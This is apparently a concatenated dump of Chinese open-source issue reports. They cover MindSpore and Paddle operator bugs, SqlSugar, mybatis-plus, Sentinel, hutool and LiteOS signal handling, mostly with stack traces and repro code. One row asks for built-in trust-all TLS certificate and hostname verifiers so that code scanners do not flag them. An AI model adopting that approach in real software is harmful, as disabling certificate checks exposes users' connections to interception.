org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [tomcat-embed-core-9.0.41.jar!/:9.0.41] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [tomcat-embed-core-9.0.41.jar!/:9.0.41] at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202) [tomcat-embed-core-9.0.41.jar!/:9.0.41] at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97) [tomcat-embed-core-9.0.41.jar!/:9.0.41] at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:542) [tomcat-embed-core-9.0.41.jar!/:9.0.41] at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:143) [tomcat-embed-core-9.0.41.jar!/:9.0.41] at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) [tomcat-embed-core-9.0.41.jar!/:9.0.41] at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) [tomcat-embed-core-9.0.41.jar!/:9.0.41] at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343) [tomcat-embed-core-9.0.41.jar!/:9.0.41] at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:374) [tomcat-embed-core-9.0.41.jar!/:9.0.41] at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.41.jar!/:9.0.41] at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:888) [tomcat-embed-core-9.0.41.jar!/:9.0.41] at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1597) [tomcat-embed-core-9.0.41.jar!/:9.0.41] at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.41.jar!/:9.0.41] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_311] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_311] at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.41.jar!/:9.0.41] at java.lang.Thread.run(Thread.java:748) [na:1.8.0_311]   <code>: DEL oauth:access:access:ce2eafeb-5d1c-4cf3-8001-19e6389a199a"
[CT][MS][inv] The performance of inv is not up to standard on CPU&GPU platform.,"The performance of gatherd is not up to standard on CPU&amp;GPU platform The performance of gatherd is not up to standard on CPU&amp;GPU platform / 硬件环境: /device /CPU/ : -- MindSpore version : 1.7.0 -- Python version : Python 3.7.5 -- OS platform and distribution : Linux Ubuntu 16.04 -- GCC/Compiler version : (/): /mode graph CPU和GPU都不通过： 仅CPU不通过： run the testcase 性能达标 GPU：   <code>: def test_performance_inv_op_100x3500(): input_shape = (100, 3500) fact = InvFactory(input_shape, dtype=np.float32) fact.forward_profile_cmp() def test_performance_inv_grad_op_100x3500(): input_shape = (100, 3500) fact = InvFactory(input_shape, dtype=np.float32) fact.grad_profile_cmp() def test_performance_inv_op_100x3500(): input_shape = (100, 3500) fact = InvFactory(input_shape, dtype=np.float32) &gt; fact.forward_profile_cmp() test_inv.py:401: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = InvFactory&lt;&gt; def forward_profile_cmp(self): forward_profile_ms = self.mindspore_profile(Inv(), 50, ""Inv"", Tensor(self.input_np)) forward_profile_tf = self.tensorflow_forward_profile(gen_math_ops.inv, 50, 'name: ""Inv""', self.input_np) print(""\nforward_profile_ms: {}us"".format(forward_profile_ms)) print(""forward_profile_tf: {}us"".format(forward_profile_tf)) &gt; assert forward_profile_tf &gt;= 0.9 * forward_profile_ms E AssertionError def test_performance_inv_grad_op_100x3500(): input_shape = (100, 3500) fact = InvFactory(input_shape, dtype=np.float32) &gt; fact.grad_profile_cmp() test_inv.py:417: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = InvFactory&lt;&gt; def grad_profile_cmp(self): grad_profile_ms = self.mindspore_profile(InvGrad(), 50, ""InvGrad"", Tensor(self.input_np), Tensor(self.output_grad_np)) grad_profile_tf = self.tensorflow_forward_profile(gen_math_ops.inv_grad, 50, 'name: ""InvGrad""', self.input_np, self.output_grad_np) print(""\ngrad_profile_ms: {}us"".format(grad_profile_ms)) print(""grad_profile_tf: {}us"".format(grad_profile_tf)) &gt; assert grad_profile_tf &gt;= 0.9 * grad_profile_ms E AssertionError ../share/ops/primitive/inv_ops.py:136: AssertionError"
【重构】pigx-common-gray 支持全局灰度路由传递,pigx版本: 3.7 是否修改包名: 否 3.6 之前灰度路由 只能实现 网关层次的灰度路由， 参考 视频页面 灰度路由 方便敏捷开发 若在长链路中使用则灰度路由失效 ，上下文 路由版本并未在 上下文传递 3.7 新增 ，需要灰度的服务 增加此依赖 即可   <code>: feign pigx-common-gray
功能新增 SSLSocketFactory&X509TrustManager&HostnameVerifier,"希望内置SSLSocketFactory&amp;X509TrustManager&amp;HostnameVerifier class 原因是有些代码扫描会提示安全问题（但是不扫描第三方jar），且这几个算是常用功能了 参照如下（具体请执行实现）： HostnameVerifier 已找到 com.dtflys.forest.ssl.TrustAllHostnameVerifier X509TrustManager 已找到 com.dtflys.forest.ssl.TrustAllManager SSLSocketFactory 已找到 已找到可以关闭了   <code>: com.dtflys.forest.ssl.SSLUtils.getSSLSocketFactory(new ForestRequest(null), ""TLS"")"
使用 groupby 方法遇到问题，求大神解惑,"生成sql语句如下 明显生成这样的语句是不对的 GROUP BY 语句 GROUP BY 语句用于结合合计函数，根据一个或多个列对结果集进行分组。 请问groupby方法的使用场景是什么，不能这样使用该怎么办？ 请尽快答复，谢谢！   <code>: SELECT code_type AS codeType, type_name AS typeName, code_value AS codeValue, code_name AS codeName, code_state AS codeState, ord_no AS ordNo FROM sys_code GROUP BY CODE_TYPE ORDER BY CODE_TYPE"
solve SIGCHLD ignored in sigsuspend(),"简要描述： 在如下场景signal可能得不到及时处理： 1、进程A设置信号a阻塞 2、进程A收到信号a 3、进程A调用sigsuspend结束阻塞 原则上，步骤三应该立刻处理之前被阻塞的信号a，调用信号处理函数，并且sigsuspend 返回。现在的问题是，信号a没有得到及时处理，并且进程A阻塞在sigsuspend()调用流程 。 【环境信息】: 网络环境 NA 硬件开发板型号 ALL 软件版本信息或tag节点 ALL 测试环境 qemu 其他 【预置条件】: 【测试步骤】： 【预期结果】： 进程执行完后退出 【实际结果】： Linux:进程执行完后退出 Liteos:进程执行一直阻塞 【恢复手段】： 【出现概率】：问题出现次数/实际测试次数 【定位信息】： Log、截图、多媒体文件等，所有和问题有关的信息：   <code>: #include ""stdio.h"" #include ""stdlib.h"" #include ""signal.h"" sigset_t sm_default; void handler(int signum) { printf(""receive signal %d\n"", signum); } void sig_init() { sigset_t sm_new; (void)sigemptyset(&amp;sm_default); sigprocmask(SIG_SETMASK, &amp;sm_default, NULL); struct sigaction act = { 0 }; act.sa_handler = handler; sigaction(SIGCHLD, &amp;act, NULL); (void)sigemptyset(&amp;sm_new); sigaddset(&amp;sm_new, SIGCHLD); sigprocmask(SIG_BLOCK, &amp;sm_new, NULL); } int main() { int pid = 0; sigset_t new, old; sig_init(); pid = fork(); if (pid == 0) { // child printf(""child process\n""); char bin[] = ""/bin/ls""; char *argv[] = { bin, ""-l"", NULL}; char *envp[] = { NULL }; int ret = execve(bin, argv, envp); perror(""execve""); printf(""ret = %d\n"", ret); } else { printf(""parent process\n""); sleep(10); printf(""start wait\n""); sigsuspend(&amp;sm_default); printf(""sigsuspend back\n""); } return 0; }"
mybatisplus结合spring cache缓存问题,"@DevYang mybatisplus-spring-boot 这个demo，我在加spring cache redis的时候发现个问题，查询分页加了缓存，缓存正常，取缓存数据的时候报错了，错误如下，是不是org.apache.ibatis.session.RowBounds 这个里面的offset 和com.fasterxml.jackson冲突了 能否解决 加缓存参照http://itindex.net/detail/52740-spring-boot-redis这个实现，我家在controller上 缓存key参照http://blog.csdn.net/syani/article/details/52239967#quote 代码如下：   <code>: package com.baomidou.springboot.controller; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.cache.annotation.CacheConfig; import org.springframework.cache.annotation.CacheEvict; import org.springframework.cache.annotation.CachePut; import org.springframework.cache.annotation.Cacheable; import org.springframework.cache.annotation.Caching; import org.springframework.web.bind.annotation.PathVariable; import org.springframework.web.bind.annotation.RequestBody; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; import com.baomidou.mybatisplus.plugins.Page; import com.baomidou.springboot.entity.User; import com.baomidou.springboot.service.IUserService; import lombok.extern.slf4j.Slf4j; /** * * 代码生成器，参考源码测试用例： * * /mybatis-plus/src/test/java/com/baomidou/mybatisplus/test/generator/MysqlGenerator.java * */ @RestController @RequestMapping(""/user"") @Slf4j @CacheConfig(cacheNames = ""usercache"") public class MyUserController { @Autowired private IUserService userService; @RequestMapping(""/save"") @Caching(evict = { @CacheEvict }, put = { @CachePut(key = ""#user.id"") }) public User save(@RequestBody User user) { log.info(user.toString()); boolean result = userService.insert(user); // 自动回写的ID Long id = user.getId(); log.info(""插入一条数据："" + result + "", 插入信息："" + user.toString()); return userService.selectById(id); } @RequestMapping(""/info/{id}"") @Cacheable(key = ""#id"") public User info(@PathVariable(""id"") String id) { return userService.selectById(id); } @RequestMapping(""/page/{start}/{size}"") @Cacheable(keyGenerator = ""cacheKeyGenerator"") public Page&lt;User&gt; page(@PathVariable(name = ""start"") String start, @PathVariable(name = ""size"") String size) { return userService.selectPage(new Page&lt;User&gt;(Integer.parseInt(start), Integer.parseInt(size))); } }"
迁移学习，加载部分模型参数问题,"想要只加载部分模型参数，然后看到Issue#12428中的这个例子， SE_ResNeXt50的例子 但是里面有一段不能理解： 在函数 network(image, train_base_model=False) 中， 然后加载参数的时候是加载在这个克隆出来的base_model_program中， 但是训练的时候是训练的另一个添加了fc层的program。 查了API说clone()是“创建一个新的、相同的Program”，说明这个clone的program应该是一个独立的program。那这个参数是怎么加载到模型里的呢？   <code>: # 复制一个只包含base_model的program，放便只加载需要的参数 base_model_program = fluid.default_main_program().clone() # 加载参数 load_pretrained_params(exe, base_model_program)"
How to get image data to infer in the Fluid?,"I see this line code: https://github.com/PaddlePaddle/Paddle/blob/ccc5418841f263dba9d89add8ac0cd3baf55bc4a/python/paddle/fluid/tests/book/test_image_classification.py#L219-L220 But in really data not is do that. And Paddle 1 load image data is: or But how to do load image data in Fluid?   <code>: def load_image(file): im = Image.open(file) im = im.resize((32, 32), Image.ANTIALIAS) im = np.array(im).astype(np.float32) im = im.transpose((2, 0, 1)) im = im[(2, 1, 0), :, :] # BGR im = im.flatten() im = im / 255.0 return im test_data.append((paddle.image.load_and_transform(image_path, 34, 32, False) .flatten().astype('float32'),))"
写个接口给小程序使用，如何访问图片链接地址,pigx版本:3.4.0 是否修改包名: 否   <code>: 上传用户头像后，如何直接访问头像图片链接地址？ 1.web前端里通过接口获取二进制流，然后把数据放在blob上显示； 2.app或小程序里获取到头像图片的链接后，如何显示？能否拼接链接直接访问？ 无
Sentinel控制台ruoyi-gateway的流控规则不显示，但是生效了，这是为什么？,"Sentinel控制台ruoyi-gateway的流控规则不显示，但是生效了，这是为什么？ 拉取RuoYi-Cloud当前最新代码 配置好相关环境，其中Sentinel版本是1.8.0 启动项目，浏览器访问，一切正常 查看Sentinel控制台 ruoyi-gateway 的 流控规则 里什么都不显示。 nacos控制台 把sentinel-ruoyi-gateway里阈值改成1。 刷新浏览器提示{""code"":500,""msg"":""请求超过最大数，请稍候再试""} 说明 流控规则是生效的 。 但是在 Sentinel控制台 ruoyi-gateway 的 流控规则 里什么都不显示。 在 ruoyi-system 项目里做测试 pom 添加 bootstrap.yml 添加 重新启动ruoyi-system 在 Sentinel控制台 ruoyi-system 的 流控规则 里 可以看到 nacos配置的规则 但是在ruoyi-gateway里流控规则就是不显示，这是为什么？   <code>: &lt;!-- sentinel datasource nacos --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.csp&lt;/groupId&gt; &lt;artifactId&gt;sentinel-datasource-nacos&lt;/artifactId&gt; &lt;/dependency&gt; sentinel: # 取消控制台懒加载 eager: true transport: # 控制台地址 dashboard: 127.0.0.1:8718 # nacos配置持久化 datasource: ds1: nacos: server-addr: 127.0.0.1:8848 dataId: sentinel-ruoyi-gateway groupId: DEFAULT_GROUP data-type: json rule-type: flow"
高并发访问，响应速度慢。,"调用如下代码：RegionUtil.getRegion(ip) 方法。持续最高5个并发请求。平均比不加多了大约1.5s。 public class RegionUtil { private static final Logger log = LoggerFactory.getLogger(RegionUtil.class); }   <code>: private static final String JAVA_TEMP_DIR = ""java.io.tmpdir""; // file(完全基于文件的查询)，vectorIndex（缓存VectorIndex索引），content（缓存整个xdb数据） // 本工具类仅支持使用“缓存整个xdb数据”方式处理。（file和vectorIndex方式非线程安全，需要将工具类优化为不同线程不同对象方式解决。） private static final String SEARCHER_TYPE = ""content""; static Searcher searcher = null; /** * 初始化IP库 */ static { try { // 因为jar无法读取文件,复制创建临时文件 String dbPath = RegionUtil.class.getResource(""/ip2region/ip2region.xdb"").getPath(); File file = new File(dbPath); if (!file.exists()) { String tmpDir = System.getProperties().getProperty(JAVA_TEMP_DIR); dbPath = tmpDir + ""ip2region.xbd""; file = new File(dbPath); ClassPathResource cpr = new ClassPathResource(""ip2region"" + File.separator + ""ip2region.xdb""); InputStream resourceAsStream = cpr.getInputStream(); if (resourceAsStream != null) { FileUtils.copyInputStreamToFile(resourceAsStream, file); } } if (""file"".equals(SEARCHER_TYPE)) { searcher = Searcher.newWithFileOnly(dbPath); } else { byte[] cBuff; if (""vectorIndex"".equals(SEARCHER_TYPE)) { cBuff = Searcher.loadVectorIndexFromFile(dbPath); searcher = Searcher.newWithVectorIndex(dbPath, cBuff); } else if (""content"".equals(SEARCHER_TYPE)) { cBuff = Searcher.loadContentFromFile(dbPath); searcher = Searcher.newWithBuffer(cBuff); } else { throw new IOException(""invalid cache policy `"" + SEARCHER_TYPE + ""`, options: file/vectorIndex/content""); } } log.info(""bean [{}]"", searcher); } catch (Exception e) { log.error(""init ip region error:{}"", e); } } /** * 解析IP * * @param ip * @return */ public static String getRegion(String ip) { try { if (searcher == null || StringUtils.isEmpty(ip)) { log.error(""Searcher is null""); return StringUtils.EMPTY; } long startTime = System.currentTimeMillis(); // 检查ip Searcher.checkIP(ip); String result = searcher.search(ip); long endTime = System.currentTimeMillis(); log.debug(""region use time[{}] result[{}]"", endTime - startTime, result); return result; } catch (Exception e) { log.error(""error:{}"", e); } return StringUtils.EMPTY; }"
NumberUtil.partValue有余数时每份+1,"JDK版本： openjdk_8_241 hutool版本： 5.3.7 有余数时加1判断有误，应该是 total % partCount &gt; 0   <code>: public static int partValue(int total, int partCount, boolean isPlusOneWhenHasRem) { int partValue = total / partCount; if (isPlusOneWhenHasRem &amp;&amp; total % partCount == 0) { partValue++; } return partValue; }"
table 通过 js 控制编辑失效,"版本：2.7.6 描述：table 在加载时候要js 控制某些行不能编辑，并且字体设置灰色，原来用的是 2.5.6 版本，在 table 的 done 事件里面控制是可以的，升级后字体颜色还有效，但是禁止编辑失效了。   <code>: done : function(res, curr, count) { //处理下拉框得显示 count || this.elem.next('.layui-table-view').find('.layui-table-header').css('overflow', 'auto'); var tableView = this.elem.next(); var jsonArr = []; layui.each(res.data, function (index, item) { if('${map.currentName}'!=item.lcs_jyry){ //alert('${map.currentName}') tableView.find('tr[data-index=' + index + ']').find('td').css(""color"", '#CCCCCC').data('edit', false); } }); //form.render(); }"
【论文复现】在Paddlepaddle的IN中，没有像Pytorch中IN的momentum部分,RD您好！ 在中，有实现momentum部分 在Paddle的或者 均没有momentum部分 我查阅了文档，有关momentum的只有momentum优化器，请问在Paddle中如何实现呢？ 期待您的回复！   <code>: torch.nn.InstanceNorm2d instance_norm InstanceNorm
点击数更新不正确的情况 ,"参考文档 String jsonResult = stringRedisTemplate.opsForValue().get(""BLOG_CLICK:"" + ip + ""#"" + blog.getUid()); 这个依旧会出现几个人同时点赞，数量只加一次的情况吧   <code>: if (StringUtils.isEmpty(jsonResult)) { //给博客点击数增加 Integer clickCount = blog.getClickCount() + 1; blog.setClickCount(clickCount); blog.updateById(); //将该用户点击记录存储到redis中, 24小时后过期 stringRedisTemplate.opsForValue().set(RedisConf.BLOG_CLICK + Constants.SYMBOL_COLON + ip + Constants.SYMBOL_WELL + blog.getUid(), blog.getClickCount().toString(), 24, TimeUnit.HOURS); } return ResultUtil.result(SysConf.SUCCESS, blog);"
数据为空,"遇到问题的原因： System.NullReferenceException: Object reference not set to an instance of an object. at SqlSugar.ExpressionTool.GetMemberValue(MemberInfo member, Expression expression) at SqlSugar.MemberExpressionResolve.ResolveMemberValue(ExpressionParameter parameter, ExpressionParameter baseParameter, Nullable1._Where(Expression expression) at SqlSugar.QueryableProvider1 expression) at CoreCms.Net.Repository.BaseRepository1 predicate, String orderBy, Boolean blUseNoLock) in D:\software\MyWork\Coreshop\CoreCms.Net.Repository\BaseRepository.cs:line 204 at CoreCms.Net.Services.BaseServices1 predicate, String orderBy, Boolean blUseNoLock) in D:\software\MyWork\Coreshop\CoreCms.Net.Services\BaseServices.cs:line 163 at CoreCms.Net.Web.WebApi.Controllers.GoodController.GetGoodsPageList(FMPageByWhereOrder entity) at lambda_method4064(Closure , Object ) at Microsoft.AspNetCore.Mvc.Infrastructure.ActionMethodExecutor.AwaitableObjectResultExecutor.Execute(IActionResultTypeMapper mapper, ObjectMethodExecutor executor, Object controller, Object[] arguments) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.g__Awaited|12_0(ControllerActionInvoker invoker, ValueTask`1 actionResultValueTask) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.g__Awaited|10_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Rethrow(ActionExecutedContextSealed context) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Next(State&amp; next, Scope&amp; scope, Object&amp; state, Boolean&amp; isCompleted) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.InvokeInnerFilterAsync() --- End of stack trace from previous location --- at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.g__Awaited|25_0(ResourceInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted) 开发环境： Linux 复显步骤： 偶发性错误，用压力测试能系统运行不到两小时基本就会重现 期望达到的效果： 多张全屏大图： 如需上传图片，可直接截图后此处粘贴即可，不需要点击上传按钮上传。   <code>: 1 isLeft, Boolean isSetTempData, MemberExpression expression) at SqlSugar.MemberExpressionResolve..ctor(ExpressionParameter parameter) at SqlSugar.BaseResolve.Start() at SqlSugar.BinaryExpressionResolve.Other(ExpressionParameter parameter) at SqlSugar.BinaryExpressionResolve..ctor(ExpressionParameter parameter) at SqlSugar.BaseResolve.Start() at SqlSugar.LambdaExpressionResolve..ctor(ExpressionParameter parameter) at SqlSugar.BaseResolve.Start() at SqlSugar.ExpressionContext.Resolve(Expression expression, ResolveExpressType resolveType) at SqlSugar.QueryBuilder.GetExpressionValue(Expression expression, ResolveExpressType resolveType) at SqlSugar.QueryableProvider 1.WhereIF(Boolean isWhere, Expression 1.QueryListByClauseAsync(Expression 1.QueryListByClauseAsync(Expression"
[CT][MS][OCCM][Ldexp] Ldexp has some problems at gpu,"在GPU环境下，两种模式 运行 用例出现错误 def test_ldexp_input_x0_dtype_complex64_3d(): input_list = [] x0_real = np.random.randn(180, 113, 74).astype(np.float32) x0_imag = np.random.randn(180, 113, 74).astype(np.float32) x0 = Tensor(x0_real + 1j * x0_imag, dtype=mstype.complex64) input_list.append(x0) x1 = Tensor(np.random.randn(180, 113, 74).astype(np.int8)) input_list.append(x1) with pytest.raises(TypeError): fact = LdexpMock(inputs=input_list) /mode graph test_ldexp_input_x0_dtype_complex64_3d gpu 用例通过 捕获异常   <code>: fact.forward_mindspore_impl()"
jwt混合模式验证不通过,"Furion 版本号 1.15.0 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp 我原先是cookie模式的，切换成混合模式后，cookie失效。添加特征后失效，不添加特征cookie可以使用 以下为我的代码 还有个问题就是设置jwt配置时报错提示已经配置过相关设置，这个配置是内置读取的吗   <code>: [ AppAuthorize, ApiDescriptionSettings(ApiGroupConsts.USER_CENTER)] public class UserAppService : IUserAppService, IDynamicApiController, ITransient services.AddJwt&lt;JwtHandler&gt;(options =&gt; { options.DefaultAuthenticateScheme = CookieAuthenticationDefaults.AuthenticationScheme; options.DefaultChallengeScheme = CookieAuthenticationDefaults.AuthenticationScheme; }) .AddCookie(CookieAuthenticationDefaults.AuthenticationScheme, b =&gt; { b.LoginPath = ""/User/Login""; b.AccessDeniedPath = ""/User/AccessDenied""; }) .AddJwtBearer(JwtBearerDefaults.AuthenticationScheme, jwtBearerOptions =&gt; { jwtBearerOptions.TokenValidationParameters = new TokenValidationParameters { ValidateIssuerSigningKey = SqlFunc.ToBool(App.Configuration[""JWTSettings:ValidateIssuerSigningKey""]), IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(App.Configuration[""JWTSettings:IssuerSigningKey""])), ValidateIssuer = SqlFunc.ToBool(App.Configuration[""JWTSettings:ValidateIssuer""]), ValidIssuer = App.Configuration[""JWTSettings:ValidIssuer""], ValidateAudience = SqlFunc.ToBool(App.Configuration[""JWTSettings:ValidateAudience""]), ValidAudience = App.Configuration[""JWTSettings:ValidAudience""], ValidateLifetime = SqlFunc.ToBool(App.Configuration[""JWTSettings:ValidateLifetime""]), ClockSkew = TimeSpan.FromMinutes(SqlFunc.ToDouble(App.Configuration[""JWTSettings:ValidateLifetime""])) }; })"
paddle.nn.Upsample在gpu下对一维数据在长度较长时报错,"AIStudio BML Codelab 高级版 / pp 2.2.1 / Python3 报错信息：OSError: (External) CUDA error(700), an illegal memory access was encountered. （这段代码没什么实际意义，就是为了用最少的代码说明问题）： 代码段1： 代码段2： 注意：第一次运行一切正常，但反复运行第二个代码段（模拟循环训练），运行到第二次时就会报错 这个问题其实不影响我使用，改成调用interpolate或者Conv1DTranspose就行了。 但我就是好奇啊，因为看了源代码也是直接调的interpolate，就封装了一层就报错了？真的想不通啊。 2021.12.30 update 新测了一下，interpolate对一维数据也会报错，但对二维数据不会。 跟反向传播也没关系，但跟数据规模有关系。 适当的把通道数、长度和batch size调大，就会报cuda地址错误。但绝对没有到超显存的程度！ 对二维图像数据处理的时候，把数据增大到爆显存，都没有报地址错误。 会报错的代码 小规模数据不会报错 对二维图像数据不会报错   <code>: import paddle # 如果改成cpu模式就没事 L = 512 # L=256时不会报错 yt = paddle.rand(shape=[16, 32, L*2]) conv = paddle.nn.Conv1D(64, 32, 3, 1, padding=1) up = paddle.nn.Upsample(scale_factor=2, mode='linear', data_format='NCW') # 对二维图像数据不会报错 x = paddle.rand(shape=[16, 64, L]) yp = up(conv(x)) # 改成直接使用functional.interpolate不会报错 loss = ((yp-yt)**2).mean() loss.backward() # 如果不反向传播也不会报错 print(loss.detach().numpy()[0]) import paddle L = 512 F = 2048 BS = 8 x = paddle.rand(shape=[BS, 64, L]) yt = paddle.rand(shape=[BS, F, L*2]) conv = paddle.nn.Conv1D(64, F, 3, 1, padding=1) for epoch in range(100): yp = paddle.nn.functional.interpolate(conv(x), scale_factor=2, mode='linear', data_format='NCW') loss = ((yp-yt)**2).mean() print(loss.detach().numpy()[0]) import paddle L = 256 F = 2048 BS = 2 x = paddle.rand(shape=[BS, 64, L]) yt = paddle.rand(shape=[BS, F, L*2]) conv = paddle.nn.Conv1D(64, F, 3, 1, padding=1) for epoch in range(100): yp = paddle.nn.functional.interpolate(conv(x), scale_factor=2, mode='linear', data_format='NCW') loss = ((yp-yt)**2).mean() print(loss.detach().numpy()[0]) import paddle L = 90 F = 2048 BS = 2 x = paddle.rand(shape=[BS, 64, L]) yt = paddle.rand(shape=[BS, F, L*2]) conv = paddle.nn.Conv2D(64, F, 3, 1, padding=1) for epoch in range(100): yp = paddle.nn.functional.interpolate(conv(x), scale_factor=2, mode='bilinear', data_format='NCHW') loss = ((yp-yt)**2).mean() print(loss.detach().numpy()[0])"
Fix statistic dump in kernel by kernel mode,"In kernel by kernel (mindRT) mode, the statistic file is not dumped. / 硬件环境: /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph set env to enable kernel by kernel mode configure ""saved_data"" to ""statistic"" to dump stat file. Start training Dump statistic file (.csv) successfully.   <code>: GRAPH_OP_RUN"
[CT][MS][SegmentMax] The testcase of SegmentMax、SegmentMin 、SegmentSum cause error when run more than one time,"The testcase of SegmentMax、SegmentMin、SegmentSum cause error when run more than one time The testcase of SegmentMax、SegmentMin、SegmentSum cause error when run more than one time / 硬件环境: /device cpu : -- Python version : Python 3.7.5 -- OS platform and distribution : Linux Ubuntu 16.04 -- GCC/Compiler version : (/): /mode pynative test_segmentmax_input_dtype_int32_3d pytest test_segmentmax.py::test_segmentmax_input_dtype_int32_3d --count 30 pytest test_segmentmin.py::test_segmentmin_input_dtype_int32_3d --count 30 pytest test_segmentsum.py::test_segmentsum_input_dtype_int32_3d --count 30 run pass and no error   <code>: def test_segmentmax_input_dtype_int32_3d(): input_list = [] x0 = Tensor(np.random.randn(18, 1, 49).astype(np.int32)) input_list.append(x0) x1 = Tensor(np.sort(np.random.randint(x0.shape[0] * 10, size=x0.shape[0])).astype(np.int32)) input_list.append(x1) fact = SegmentMaxMock(inputs=input_list) fact.forward_cmp() fact.grad_cmp() def test_segmentmax_input_dtype_int32_3d(): input_list = [] x0 = Tensor(np.random.randn(18, 1, 49).astype(np.int32)) input_list.append(x0) x1 = Tensor(np.sort(np.random.randint(x0.shape[0] * 10, size=x0.shape[0])).astype(np.int32)) input_list.append(x1) fact = SegmentMaxMock(inputs=input_list) &gt; fact.forward_cmp() test_segmentmax.py:216: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/segmentmax_ops.py:82: in forward_cmp allclose_nparray(out_tf, out_mindspore, self.loss, self.loss) ../share/utils.py:30: in allclose_nparray elif not np.allclose(data_expected, data_me, rtol, atol, equal_nan=equal_nan): &lt;__array_function__ internals&gt;:6: in allclose ??? /root/archiconda3/envs/zhujunan2/lib/python3.7/site-packages/numpy/core/numeric.py:2249: in allclose res = all(isclose(a, b, rtol=rtol, atol=atol, equal_nan=equal_nan)) &lt;__array_function__ internals&gt;:6: in isclose ??? /root/archiconda3/envs/zhujunan2/lib/python3.7/site-packages/numpy/core/numeric.py:2358: in isclose return within_tol(x, y, atol, rtol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ x = array([[[ 0, 0, 0, ..., 0, 0, 0]], [[ 0, 0, 0, ..., 0, 0, 0]], [[ 0, 0, 0, ..., 0, 0, 0... 0, ..., 0, 0, 0]], [[ 0, 0, 0, ..., 0, 0, 0]], [[ 0, -1, -1, ..., 0, 0, 0]]], dtype=int32) y = array([[[ 0., 0., 0., ..., 0., 0., 0.]], [[ 0., 0., 0., ..., 0., 0., 0.]], [[ 0., 0., 0., ...., ..., 0., 0., 0.]], [[ 0., 11., 16., ..., 0., 0., 0.]], [[ 0., 0., 0., ..., 0., 0., 0.]]]) atol = 0, rtol = 0 def within_tol(x, y, atol, rtol): with errstate(invalid='ignore'): &gt; return less_equal(abs(x-y), atol + rtol * abs(y)) E ValueError: operands could not be broadcast together with shapes (169,1,49) (177,1,49)"
[CT][MS][OP] NonDeterministicInts testcase cause core dump error when input with 0d tensor,"NonDeterministicInts testcase cause core dump error when input with 0d tensor / 硬件环境: /device cpu : -- MindSpore version : master -- Python version : Python 3.7.5 -- OS platform and distribution : Ubuntu 16.04 -- GCC/Compiler version : (/): /mode pynative /mode graph test_non_deterministic_dim_0: pytest -s test_nondeterministicints.py::test_non_deterministic_dim_0 raise error   <code>: def test_non_deterministic_dim_0(): input_ = Tensor(2, dtype=mstype.int64) print(input_.shape) fact = NonDeterministicIntsMock(inputs=input_, attributes={'dtype': mstype.int32}) with pytest.raises((RuntimeError, ValueError)): fact.forward_mindspore_impl() Current thread 0x0000ffffabe10010 (most recent call first): File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 635 in compile File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 785 in compile File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 800 in 